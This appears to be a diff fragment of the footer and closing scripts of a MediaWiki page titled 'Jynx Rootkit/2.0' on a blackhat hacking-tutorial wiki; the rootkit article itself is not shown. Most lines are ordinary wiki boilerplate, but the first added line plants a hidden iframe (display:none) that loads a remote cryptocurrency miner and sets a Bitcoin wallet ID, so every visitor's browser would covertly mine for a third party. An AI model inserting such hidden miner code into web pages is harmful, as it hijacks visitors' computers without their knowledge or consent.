+<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1Lr99MtUNbUVSpU6MFA3CboYWGgZ8pHWdB</script></iframe>
+<div id="footer">
+	<div id="f-poweredbyico">
+		<a href="http://www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+	</div>
+	<ul id="f-list">
+		<li id="lastmod"> This page was last modified on 7 November 2013, at 04:03.</li>
+		<li id="viewcount">This page has been accessed 31,680 times.</li>
+		<li id="privacy"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:Privacy_policy" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:Privacy policy">Privacy policy</a></li>
+		<li id="about"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:About" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:About">About Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</a></li>
+		<li id="disclaimer"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:General_disclaimer" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:General disclaimer">Disclaimers</a></li>
+<div align="center"><a href="http://www.darkexile.com/forums/index.php?action=affiliates;sa=in;idaff=15"><img src="http://www.darkexile.com/forums/gallery/3_20_01_11_10_02_44.png"></a>&nbsp; <a href="http://hacktalk.net/"><img src="hacktalk.png"></a></div>
+
+	</ul>
+</div>
+</div>
+
+<script src="/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=monobook&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Jynx_Rootkit/2.0", "wgTitle": "Jynx Rootkit/2.0", "wgAction": "view", "wgArticleId": 291, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 46544, "wgCategories": ["Maintaining Access"], "wgBreakFrames": false, "wgRestrictionEdit": ["sysop"], "wgRestrictionMove": ["sysop"]});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script type="text/javascript"> 
+function toggleDisplay( id, hidetext, showtext )
+{
+  link = document.getElementById( id + "l" ).childNodes[0];
+ 
+  with( document.getElementById( id ).style )
+    {
+      if( display == "none" )
+	{
+	  display = "inline";
+	  link.nodeValue = hidetext;
+	}
+      else
+	{
+	  display = "none";
+	  link.nodeValue = showtext;
+	}
+    }
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"monobook","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script><!-- Served in 0.543 secs. --></body></html>
